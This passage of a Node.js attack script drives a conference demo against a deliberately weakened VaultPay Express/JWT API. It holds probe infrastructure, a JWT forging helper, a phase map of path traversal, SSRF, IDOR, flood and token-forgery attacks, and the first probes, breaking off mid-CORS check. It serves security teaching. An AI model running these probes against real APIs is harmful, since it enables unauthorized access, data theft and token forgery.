#!/usr/bin/env node
/**
 * VaultPay demo attacker
 * ======================
 *
 * Black-box script against a VaultPay-style **Express 5** + JWT API.
 * (Target ships express@^5.2.1 — https://expressjs.com/en/guide/migrating-5/)
 *
 * Console output is built for a live talk: every probe shows
 * intent → wire request → response → loot / finding, plus a running scoreboard.
 *
 * Phase navigation (log title → function)
 * ---------------------------------------
 * Each demo beat prints:  `PHASE NN  ·  <title>`  via step(title).
 * To find which function owns a console phase:
 *   1. Jump to the **PHASE MAP** comment above the first phase* function
 *   2. Or search `async function phase` / the exact step("…") title string
 *   3. main() at the bottom lists call order with the same names
 *
 * Usage:
 *   node attack.mjs <API_BASE_URL>
 *   node attack.mjs http://localhost:4000 --reset
 *   node attack.mjs https://vaultpay-api.vercel.app --drama --reset
 *   node attack.mjs http://localhost:4000 --verbose
 *   node attack.mjs http://localhost:4000 --skip-flood --skip-slow
 *
 * Flags:
 *   --quiet       minimal color + hide wire traces (summary only)
 *   --verbose     print response body previews on every request
 *   --drama       wait for Enter between phases (stage pacing — same attack, you control the beat)
 *   --projector   no dim text, less wire noise, wider spacing (big rooms)
 *   --json        print machine-readable findings at the end
 *   --skip-flood  skip concurrent login flood
 *   --skip-slow   skip the slow-endpoint probe
 *   --reset       POST /api/demo/reset before recon (warm-isolate hygiene)
 *   --gate=TOKEN  send X-VaultPay-Demo (or set DEMO_GATE_TOKEN env)
 *   --internal=URL  base URL of the SSRF stand-in "internal service"
 *                   (or set INTERNAL_SERVICE_URL; see scripts/internal-service.mjs)
 *
 * End of run: ENGAGEMENT REPORT → DEMO RESULT → REMEDIATION footer (once, not per phase).
 *
 * Legal: only attack systems you own or have written permission to test.
 */

import { createHmac } from "node:crypto";
import net from "node:net";
import readline from "node:readline/promises";
import { stdin as input, stdout as output } from "node:process";

const rawArgs = process.argv.slice(2);
const flags = new Set(rawArgs.filter((a) => a.startsWith("--") && !a.includes("=")));
const positional = rawArgs.filter((a) => !a.startsWith("--"));
const targetArg = positional[0];

const quiet = flags.has("--quiet");
const verbose = flags.has("--verbose");
const drama = flags.has("--drama");
const projector = flags.has("--projector");
const asJson = flags.has("--json");
const skipFlood = flags.has("--skip-flood");
const skipSlow = flags.has("--skip-slow");
const doReset = flags.has("--reset");

/** Optional shared secret for gated public demos (server DEMO_GATE_TOKEN). */
let gateToken = process.env.DEMO_GATE_TOKEN || "";
let resetToken = process.env.DEMO_RESET_TOKEN || "";
/** SSRF stand-in target the API can reach but the attacker cannot. */
let internalService = process.env.INTERNAL_SERVICE_URL || "";
for (const a of rawArgs) {
  if (a.startsWith("--gate=")) gateToken = a.slice("--gate=".length);
  if (a.startsWith("--reset-token=")) resetToken = a.slice("--reset-token=".length);
  if (a.startsWith("--internal=")) internalService = a.slice("--internal=".length);
}
internalService = internalService.replace(/\/$/, "");

// Wire logging is ON by default for talks; --quiet turns it off.
// --projector keeps findings readable but trims per-request wire noise.
const showWire = !quiet && !projector;

if (!targetArg) {
  console.error(
    "Usage: node attack.mjs <API_BASE_URL> [--quiet] [--verbose] [--drama] [--projector] [--json] [--skip-flood] [--skip-slow] [--reset] [--gate=TOKEN] [--internal=URL]"
  );
  process.exit(2);
}

const BASE = targetArg.replace(/\/$/, "");
let baseUrl;
try {
  baseUrl = new URL(BASE);
} catch {
  console.error(`Invalid URL: ${targetArg}`);
  process.exit(2);
}

const HOST = baseUrl.hostname;
const PORT = Number(baseUrl.port) || (baseUrl.protocol === "https:" ? 443 : 80);
const IS_TLS = baseUrl.protocol === "https:";

// ---------------------------------------------------------------------------
// Colors + console helpers (crafted for high contrast in dark & light terminals)
// ---------------------------------------------------------------------------
const isTTY = process.stdout.isTTY && !quiet;
const supports256 = isTTY && (typeof process.stdout.hasColors === "function" ? process.stdout.hasColors(256) : true);

// Dim gray that works on both dark (black) and light (white) background themes:
const dimCode = projector ? "" : isTTY ? (supports256 ? "\x1b[38;5;245m" : "\x1b[2m") : "";

const c = {
  reset: isTTY ? "\x1b[0m" : "",
  bold: isTTY ? "\x1b[1m" : "",
  dim: dimCode,
  red: isTTY ? (supports256 ? "\x1b[38;5;203m" : "\x1b[91m") : "",
  green: isTTY ? (supports256 ? "\x1b[38;5;40m" : "\x1b[92m") : "",
  yellow: isTTY ? (supports256 ? "\x1b[38;5;208m" : "\x1b[93m") : "", // Warm Amber — highly visible on both light & dark!
  blue: isTTY ? (supports256 ? "\x1b[38;5;39m" : "\x1b[94m") : "",   // Bright Sky Blue — visible on both light & dark!
  magenta: isTTY ? (supports256 ? "\x1b[38;5;171m" : "\x1b[95m") : "",
  cyan: isTTY ? (supports256 ? "\x1b[38;5;38m" : "\x1b[96m") : "",
  white: isTTY ? (supports256 ? "\x1b[38;5;231m" : "\x1b[97m") : "",
  bgRed: isTTY ? (supports256 ? "\x1b[48;5;196m" : "\x1b[41m") : "",
  bgGreen: isTTY ? (supports256 ? "\x1b[48;5;34m" : "\x1b[42m") : "",
  bgYellow: isTTY ? (supports256 ? "\x1b[48;5;208m" : "\x1b[43m") : "",
  bgBlue: isTTY ? (supports256 ? "\x1b[48;5;33m" : "\x1b[44m") : "",
  bgMagenta: isTTY ? (supports256 ? "\x1b[48;5;127m" : "\x1b[45m") : "",
};

const startedAt = Date.now();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * Stage pacing: --drama waits for Enter between phases so you can talk over a frozen screen.
 * Without --drama, phases run straight through. Non-TTY falls back to a short sleep.
 */
const dramaPause = async () => {
  if (!drama) return;
  if (!input.isTTY) {
    await sleep(400);
    return;
  }
  const rl = readline.createInterface({ input, output });
  try {
    await rl.question(`  ${c.dim}[Enter] continue…${c.reset} `);
  } finally {
    rl.close();
  }
};

function banner() {
  console.log(`
${c.red}${c.bold}╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ██████╗ ███████╗███╗   ███╗ ██████╗                                ║
║   ██╔══██╗██╔════╝████╗ ████║██╔═══██╗                               ║
║   ██║  ██║█████╗  ██╔████╔██║██║   ██║                               ║
║   ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║                               ║
║   ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝                               ║
║   ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝                                ║
║                                                                      ║
║   JWT ≠ Secure API   ·   Express 5 target   ·   black-box            ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
  console.log(`${c.bold}Target${c.reset}   ${c.cyan}${BASE}${c.reset}`);
  console.log(`${c.bold}Started${c.reset}  ${new Date().toISOString()}`);
  console.log(
    `${c.bold}Claim${c.reset}   JWT authenticates signed claims; authorization and safe application behavior still require explicit controls.`
  );
  console.log(
    `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "Enter" : "off"}  projector=${projector ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  slow=${skipSlow ? "off" : "on"}  reset=${doReset ? "on" : "off"}  gate=${gateToken ? "on" : "off"}  internal=${internalService || "none"}`
  );
  if (process.env.NODE_TLS_REJECT_UNAUTHORIZED === "0") {
    console.log(
      `${c.yellow}${c.bold}TLS${c.reset}     NODE_TLS_REJECT_UNAUTHORIZED=0 (corporate MITM / Zscaler — demo laptop only)`
    );
  }
  console.log(
    `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim}  ${c.green}← RECV${c.reset}${c.dim}  ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim}  ${c.red}✗ APP HOLE${c.reset}${c.dim}  ${c.yellow}◇ PLATFORM${c.reset}${c.dim}  ${c.green}✓ OK${c.reset}${c.dim}  kind: framework-gap | misconfig | app-code${c.reset}\n`
  );
  console.log("  Ratings are demo-author judgments, not OWASP scores or CVSS. API tags use 2023; CWE tags identify specific weaknesses. Scoreboards count cumulative finding records, not unique root causes.");
}

/**
 * Running phase counter for console banners.
 * Incremented only when {@link step} runs — so numbers shift if a phase
 * is skipped early (e.g. phaseReset without --reset never calls step).
 */
let phaseNo = 0;

/**
 * Prints the magenta PHASE banner seen in console logs (and in each phase* JSDoc):
 *
 *   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *     PHASE 01  ·  <title>
 *   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *
 * Call once at the start of each attack phase function.
 * Numbers: with --reset, PHASE MAP 01–16; without --reset, skip 01 and renumber.
 *
 * @param {string} title - Exact middle line of the banner (must match step string + JSDoc)
 */
function step(title) {
  phaseNo += 1;
  const n = String(phaseNo).padStart(2, "0");
  if (projector) console.log("");
  console.log(
    `\n${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
  );
  console.log(`${c.bold}${c.magenta}  PHASE ${n}  ·  ${title}${c.reset}`);
  console.log(
    `${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
  );
  if (projector) console.log("");
}

function intent(msg) {
  console.log(`  ${c.bgBlue}${c.white}${c.bold} WHY  ${c.reset} ${msg}`);
}

function narrate(msg) {
  console.log(`  ${c.cyan}»${c.reset} ${msg}`);
}

function ok(msg) {
  // Expected behavior or probe did not fire — NOT "the app is secure".
  console.log(`  ${c.green}✓ OK${c.reset}             ${msg}`);
}

function bad(msg) {
  // Application-layer hole the audience should fear.
  console.log(`  ${c.red}✗ APP HOLE${c.reset}       ${msg}`);
}

function platform(msg) {
  // Edge / CDN / Worker runtime blocked the probe — not app authz.
  console.log(`  ${c.yellow}◇ PLATFORM${c.reset}       ${msg}`);
}

function info(msg) {
  console.log(`  ${c.dim}· ${msg}${c.reset}`);
}

function loot(label, value) {
  const raw = String(value ?? "");
  const v = raw.length > 200 ? raw.slice(0, 200) + "…" : raw;
  console.log(
    `  ${c.bgRed}${c.white}${c.bold} LOOT ${c.reset} ${c.yellow}${c.bold}${label}${c.reset}  ${v}`
  );
}

function finding(severity, title, meta = {}) {
  const colors = {
    CRITICAL: c.red,
    HIGH: c.yellow,
    MEDIUM: c.blue,
    INFO: c.dim,
  };
  const color = colors[severity] || c.white;
  const owasp = meta.owasp ? ` ${c.dim}[${meta.owasp}:2023]${c.reset}` : "";
  const cwe = meta.cwe ? ` ${c.dim}[${meta.cwe}]${c.reset}` : "";
  const kind = meta.kind ? ` ${c.dim}(${meta.kind})${c.reset}` : "";
  console.log(`  ${color}${c.bold}[${severity}]${c.reset}${owasp}${cwe}${kind} ${title}`);
}

function scoreboard() {
  const by = stolen.findings.reduce((m, f) => {
    m[f.severity] = (m[f.severity] || 0) + 1;
    return m;
  }, {});
  const crit = by.CRITICAL || 0;
  const high = by.HIGH || 0;
  const med = by.MEDIUM || 0;
  const infoN = by.INFO || 0;
  console.log(
    `  ${c.dim}── scoreboard (cumulative finding records): ${c.red}${crit} critical${c.dim} · ${c.yellow}${high} high${c.dim} · ${c.blue}${med} medium${c.dim} · ${infoN} info · loot users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}${c.reset}`
  );
}

function previewBody(text, max = verbose ? 400 : 160) {
  if (!text) return "(empty)";
  const one = text.replace(/\s+/g, " ").trim();
  return one.length > max ? one.slice(0, max) + "…" : one;
}

function formatAuth(headers = {}) {
  const a = headers.Authorization || headers.authorization;
  if (!a) return "none";
  if (a.length <= 28) return a;
  return a.slice(0, 22) + "…" + a.slice(-8);
}

function statusColor(status) {
  if (status >= 200 && status < 300) return c.green;
  if (status >= 300 && status < 400) return c.yellow;
  if (status >= 400 && status < 500) return c.yellow;
  if (status >= 500) return c.red;
  return c.dim;
}

// ---------------------------------------------------------------------------
// HTTP with talk-friendly wire logs
// ---------------------------------------------------------------------------
let reqSeq = 0;

/**
 * @param {string} method
 * @param {string} path
 * @param {{ headers?: Record<string,string>, body?: unknown, timeoutMs?: number, label?: string, silent?: boolean }} [opts]
 */
async function http(method, path, opts = {}) {
  const {
    headers = {},
    body,
    timeoutMs = 15_000,
    label,
    silent = false,
  } = opts;

  const id = ++reqSeq;
  const payload = body !== undefined ? JSON.stringify(body) : undefined;
  const bytes = payload ? Buffer.byteLength(payload) : 0;

  if (showWire && !silent) {
    const tag = label ? ` ${c.dim}(${label})${c.reset}` : "";
    console.log(
      `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${id}${c.reset}${tag}  ${c.bold}${method}${c.reset} ${c.cyan}${path}${c.reset}`
    );
    console.log(
      `           ${c.dim}auth=${formatAuth(headers)}  body=${bytes ? bytes + " B" : "—"}  timeout=${timeoutMs}ms${c.reset}`
    );
    if (verbose && body && bytes < 2_000) {
      console.log(`           ${c.dim}json=${previewBody(JSON.stringify(body), 280)}${c.reset}`);
    } else if (verbose && body && bytes >= 2_000) {
      console.log(`           ${c.dim}json=(oversized payload, ${bytes} bytes)${c.reset}`);
    }
  }

  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  const t0 = Date.now();
  try {
    const res = await fetch(`${BASE}${path}`, {
      method,
      headers: {
        Accept: "application/json, text/plain, */*",
        ...(payload !== undefined ? { "Content-Type": "application/json" } : {}),
        ...(gateToken ? { "X-VaultPay-Demo": gateToken } : {}),
        ...headers,
      },
      body: payload,
      redirect: "manual",
      signal: ctrl.signal,
    });
    const text = await res.text();
    const ms = Date.now() - t0;
    let json = null;
    try {
      json = JSON.parse(text);
    } catch {
      /* not json */
    }
    const headerObj = {};
    res.headers.forEach((v, k) => {
      headerObj[k.toLowerCase()] = v;
    });

    if (showWire && !silent) {
      const sc = statusColor(res.status);
      console.log(
        `  ${c.green}${c.bold}← RECV${c.reset}  ${c.bold}#${id}${c.reset}  ${sc}${c.bold}${res.status}${c.reset}  ${c.dim}${ms}ms  ${text.length} B${c.reset}`
      );
      if (headerObj.location) {
        console.log(`           ${c.dim}Location: ${headerObj.location}${c.reset}`);
      }
      if (verbose || res.status >= 500 || (json && (json.error || json.jwtSecret || json.stack))) {
        console.log(`           ${c.dim}body: ${previewBody(text)}${c.reset}`);
      } else if (showWire && text && text.length < 120) {
        console.log(`           ${c.dim}body: ${previewBody(text, 120)}${c.reset}`);
      }
    }

    return { status: res.status, headers: headerObj, text, json, ms, id };
  } catch (err) {
    const ms = Date.now() - t0;
    if (showWire && !silent) {
      console.log(
        `  ${c.red}${c.bold}← FAIL${c.reset}  ${c.bold}#${id}${c.reset}  ${c.red}${err.message}${c.reset}  ${c.dim}${ms}ms${c.reset}`
      );
    }
    throw err;
  } finally {
    clearTimeout(timer);
  }
}

/** Raw TCP HTTP/1.1 for probes fetch() cannot express cleanly. */
function rawHttp(payload, waitMs = 2500, label = "raw-tcp") {
  return new Promise((resolve) => {
    if (IS_TLS) {
      info("raw TCP skipped on HTTPS targets");
      resolve({ raw: "", status: 0, skipped: true });
      return;
    }
    const id = ++reqSeq;
    if (showWire) {
      const firstLine = payload.split("\r\n")[0];
      console.log(
        `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${id}${c.reset} ${c.dim}(${label})${c.reset}  raw TCP ${c.cyan}${firstLine}${c.reset}`
      );
      console.log(`           ${c.dim}payload=${payload.length} B to ${HOST}:${PORT}${c.reset}`);
    }
    const sock = net.connect(PORT, HOST);
    let buf = "";
    const t0 = Date.now();
    const finish = () => {
      try {
        sock.destroy();
      } catch {
        /* ignore */
      }
      const statusLine = buf.split("\r\n")[0] || "";
      const m = /HTTP\/\d\.\d\s+(\d{3})/.exec(statusLine);
      const status = m ? Number(m[1]) : 0;
      const ms = Date.now() - t0;
      if (showWire) {
        console.log(
          `  ${c.green}${c.bold}← RECV${c.reset}  ${c.bold}#${id}${c.reset}  ${statusColor(status)}${c.bold}${status || "—"}${c.reset}  ${c.dim}${ms}ms  ${buf.length} B  ${statusLine.slice(0, 60)}${c.reset}`
        );
      }
      resolve({ raw: buf, statusLine, status, skipped: false, ms });
    };
    sock.setTimeout(waitMs);
    sock.on("connect", () => sock.write(payload));
    sock.on("data", (d) => {
      buf += d.toString("latin1");
    });
    sock.on("timeout", finish);
    sock.on("close", finish);
    sock.on("error", finish);
  });
}

function b64url(input) {
  return Buffer.from(input)
    .toString("base64")
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
}

function signHs256(payloadObj, secret) {
  const header = b64url(JSON.stringify({ alg: "HS256", typ: "JWT" }));
  const payload = b64url(JSON.stringify(payloadObj));
  const data = `${header}.${payload}`;
  const sig = createHmac("sha256", secret)
    .update(data)
    .digest("base64")
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
  return `${data}.${sig}`;
}

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
const stolen = {
  users: [],
  orders: [],
  jwtSecret: null,
  token: null,
  loginUser: null,
  forgedAdminToken: null,
  escalated: false,
  findings: [],
  platformNotes: [],
};

/**
 * @param {string} severity
 * @param {string} title
 * @param {string} [detail]
 * @param {{ kind?: "framework-gap"|"misconfig"|"app-code"|"platform", owasp?: string, cwe?: string, source?: string }} [meta]
 *
 * kind:
 *   framework-gap — Express does not provide this control by default
 *   misconfig     — demo deliberately weakened / replaced a safer default
 *   app-code      — vulnerable route / app logic (not a framework default)
 *   platform      — edge/runtime behavior
 */
function record(severity, title, detail, meta = {}) {
  const entry = {
    severity,
    title,
    detail,
    kind: meta.kind || "app-code",
    owasp: meta.owasp || null,
    cwe: meta.cwe || null,
    source: meta.source || "app",
  };
  stolen.findings.push(entry);
  finding(severity, title, entry);
  if (detail) info(detail);
  scoreboard();
}

function notePlatform(title, detail) {
  stolen.platformNotes.push({ title, detail });
  platform(title);
  if (detail) info(detail);
}

// ---------------------------------------------------------------------------
// Attack phases
// ---------------------------------------------------------------------------
//
// PHASE MAP — same banner shape as the live console (with --reset numbering).
// Without --reset, phaseReset prints nothing and every later number is N-1.
// Scroll to `async function phase…` — each function’s JSDoc opens with this box.
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 01  ·  Demo reset — re-seed in-memory state
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseReset  (--reset only)
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 02  ·  Recon — is the API alive?
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseRecon
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 03  ·  Missing browser security headers (no login)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseMissingSecurityHeaders
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 04  ·  CORS health-response policy (no login)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseCorsMisconfig
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 05  ·  Oversized JSON body (demo misconfig — not Express default)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseBodyLimit
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 06  ·  Login flood — observed authentication throttling
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseNoRateLimitFlood  (--skip-flood)
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 07  ·  Path traversal on /api/files (no login)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phasePathTraversal
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 08  ·  Open redirect on /api/go (no login)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseOpenRedirect
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 09  ·  Open proxy / SSRF on /api/proxy (no login)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseSsrfProxy  (+ probeMetadataEgress, probeInternalPivot)
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 10  ·  Error stack leak + reflected XSS sink (no login)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseStackAndEcho
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 11  ·  Slow handler holds the connection (no login)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseSlowTimeout  (--skip-slow)
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 12  ·  Unauthenticated data theft (users / IDOR / search / debug)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseUnauthDataTheft
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 13  ·  Account enumeration via login error messages
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseAccountEnumeration
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 14  ·  Unauthenticated settings write
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseSettingsMerge
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 15  ·  Raw socket header / framing probes (HTTP only)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseRawHeaderAbuse  (HTTPS targets skip body)
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   PHASE 16  ·  Login, BOLA, mass assignment, admin, JWT forge
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//   → phaseAuthzAndForgery  (uses demoLogin)
//
// Then: printReport() → ENGAGEMENT REPORT (not a PHASE banner)
// Search: "PHASE 13" or step("…") title string.
// ---------------------------------------------------------------------------

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 01  ·  Demo reset — re-seed in-memory state
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseReset
 * Only when --reset (otherwise silent return, no banner). Without --reset, later PHASE NN are N-1.
 * Endpoint: POST /api/demo/reset  (optional header X-VaultPay-Reset)
 *
 * Why: warm Worker/serverless isolates keep mutated demo users (e.g. "Hijacked Bob").
 * Re-seed Alice/Bob/admin before the talk reveal so LOOT is clean.
 */
async function phaseReset() {
  if (!doReset) return;
  step("Demo reset — re-seed in-memory state");
  intent("Warm Worker/serverless isolates keep prior LOOT (Hijacked Bob). Reset before the reveal.");
  const res = await http("POST", "/api/demo/reset", {
    label: "demo-reset",
    headers: resetToken ? { "X-VaultPay-Reset": resetToken } : {},
  });
  if (res.status === 200 && res.json?.ok) {
    ok("Demo DB re-seeded (Alice/Bob/admin clean)");
  } else {
    info(`Reset → ${res.status} (DEMO_RESET_TOKEN may be required)`);
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 02  ·  Recon — is the API alive?
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseRecon
 * Endpoints: GET /api/health, GET / (fallback + self-docs)
 *
 * Confirms the target responds and optionally prints advertised route docs from `/`.
 * Exits process if the host is unreachable.
 */
async function phaseRecon() {
  step("Recon — is the API alive?");
  intent("Confirm the target responds before we burn time on exploits.");
  try {
    const health = await http("GET", "/api/health", { label: "health-check" });
    if (health.status === 200) {
      ok(`API is up: service=${health.json?.service || "?"} time=${health.json?.time || "?"}`);
    } else {
      const root = await http("GET", "/", { label: "root-fallback" });
      if (root.status >= 200 && root.status < 500) ok(`Root answered ${root.status}`);
      else {
        bad(`No useful response (health ${health.status})`);
        process.exit(1);
      }
    }
  } catch (err) {
    bad(`Cannot reach ${BASE}: ${err.message}`);
    process.exit(1);
  }
  const root = await http("GET", "/", { label: "self-docs" });
  if (root.json?.docs) {
    narrate("API helpfully advertises its own routes:");
    info(JSON.stringify(root.json.docs));
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 03  ·  Missing browser security headers (no login)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseMissingSecurityHeaders
 * Endpoint: GET /api/health (header audit only)
 *
 * Checks for CSP / XFO / nosniff / HSTS / referrer / permissions-policy and
 * X-Powered-By. Records framework-gap findings when headers are missing.
 */
async function phaseMissingSecurityHeaders() {
  step("Missing browser security headers (no login)");
  intent(
    "Express does not install Helmet-style secure browser headers on normal responses (framework gap; docs recommend Helmet)."
  );
  const res = await http("GET", "/api/health", { label: "header-audit" });
  const needed = [
    "x-content-type-options",
    "x-frame-options",
    "content-security-policy",
    "strict-transport-security",
    "referrer-policy",
    "permissions-policy",
  ];
  narrate("Checking response headers for browser hardening…");
  for (const h of needed) {
    if (res.headers[h]) ok(`${h}: ${res.headers[h]}`);
    else bad(`${h}: MISSING`);
  }
  if (res.headers["x-powered-by"]) {
    bad(`x-powered-by: ${res.headers["x-powered-by"]} (Express default ON — free fingerprint)`);
    record(
      "INFO",
      "X-Powered-By: Express left enabled",
      "Express enables x-powered-by by default (application.js); disable with app.disable('x-powered-by'). Official security guide: reduce fingerprinting.",
      { kind: "framework-gap" }
    );
  }
  const missing = needed.filter((h) => !res.headers[h]);
  if (missing.length >= 3) {
    loot("missing-headers", missing.join(", "));
    // Edge may add HSTS (e.g. Vercel); remaining gaps are still app/framework posture.
    record(
      "INFO",
      "Security headers missing on health response",
      "Response observation, not proof of missing middleware or exploitability. Header applicability depends on content, browser usage, TLS, and edge configuration.",
      { kind: "framework-gap", owasp: "API8" }
    );
  } else {
    ok(`Most security headers present (${needed.length - missing.length}/${needed.length})`);
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 04  ·  CORS health-response policy (no login)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseCorsMisconfig
 * Endpoint: GET /api/health with Origin: https://evil-attacker.example
 *
 * Demo misconfig: app added cors({ origin: "*" }). Bare Express has no CORS at all.
 * Finding kind is misconfig, not framework-gap.
 */
async function phaseCorsMisconfig() {
  step("CORS health-response policy (no login)");
  intent(
    "CORS controls browser response access, not API authorization. This demo added wildcard CORS; the probe checks only the health response, not victim-session access."
  );
  const evilOrigin = "https://evil-attacker.example";
  narrate(`GET /api/health with Origin: ${evilOrigin}…`);
  const res = await http("GET", "/api/health", {
    label: "cors-origin",
    headers: { Origin: evilOrigin },
  });
  const acao = res.headers["access-control-allow-origin"] || "";
